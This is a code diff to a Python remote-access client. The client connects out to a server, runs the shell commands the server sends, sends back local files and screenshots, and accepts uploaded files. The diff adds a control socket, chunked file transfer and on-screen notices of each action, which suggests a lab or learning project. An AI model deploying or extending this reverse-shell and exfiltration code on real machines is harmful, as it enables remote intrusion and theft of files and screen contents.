@@ -4,9 +4,18 @@ import subprocess
 import struct
 import base64
 import io
-import time
 import re
+import signal
+from colorama import init, Fore, Back, Style
 from PIL import ImageGrab
+
+def def_handler(sig, frame):
+    print(Fore.RED + "\n\nExiting...\n" + Style.RESET_ALL)
+    sys.exit(1)
+    sys.exit(1)
+
+signal.signal(signal.SIGINT, def_handler)
+
 
 class Client:
     """A class representing the client that connects to the server via sockets.
@@ -26,6 +35,7 @@ class Client:
         self.host = ip
         self.port = port
         self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.control_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     def makeConnection(self):
         """
@@ -34,11 +44,16 @@ class Client:
 
         self.server_socket.connect((self.host, self.port))
 
+        #Control socket
+        self.control_socket.connect((self.host, 65000))
+
         #Send client OS
         if os.name == 'nt':
-            self.server_socket.send(b'WIN')
+            self.control_socket.send(b'WIN')
         elif os.name == 'posix':
-            self.server_socket.send(b'LIN')
+            self.control_socket.send(b'LIN')
+
+        print("Connected to the server - {}:{}".format(self.host, self.port))
 
 
     def quitConnection(self):
@@ -61,11 +76,13 @@ class Client:
 
         if data.startswith(b"download"):
             file = data[8:].decode()
-            self.server_socket.settimeout(None)
-            with open(file, 'rb') as f:
-                data = f.read()
-                self.server_socket.sendall(data)
+            print("Server has downloaded file "+Fore.RED+"{}".format(file)+Style.RESET_ALL)
 
+            with open(file, 'rb') as f:
+            	chunk = f.read(1024)
+            	while chunk:
+            		self.server_socket.sendall(chunk)
+            		chunk = f.read(1024)
 
         if data.startswith(b"netstat"):
             self.executeAndSend('netstat -nat')
@@ -78,13 +95,16 @@ class Client:
 
         if data.startswith(b"screenshot"):
             # Take a screenshot and save it as PNG
+
+
             screenshot = ImageGrab.grab()
             buffer = io.BytesIO()
             screenshot.save(buffer, format='PNG')
-            buffer.seek(0)
+            screenshot_bytes = buffer.getvalue()
 
             #Send screenshot
-            self.server_socket.sendall(buffer.read())
+            self.server_socket.sendall(screenshot_bytes)
+            print("Screenshot sent successfully!")
 
 
         if data.startswith(b"upload"):
@@ -112,15 +132,17 @@ class Client:
                         return
                 self.server_socket.settimeout(None)
                 f.close()
+                print(f"File {path} saved successfully!")
                 return
 
     def executeAndSend(self, command):
         output = os.popen(command).read()
-        print(output)
+        print("Running command "+ Fore.RED + "{}".format(command) + Style.RESET_ALL)
         self.server_socket.send(output.encode('utf-8'))
 
     def start(self):
         self.makeConnection()
         while True:
             self.listenForCommands()
+
 
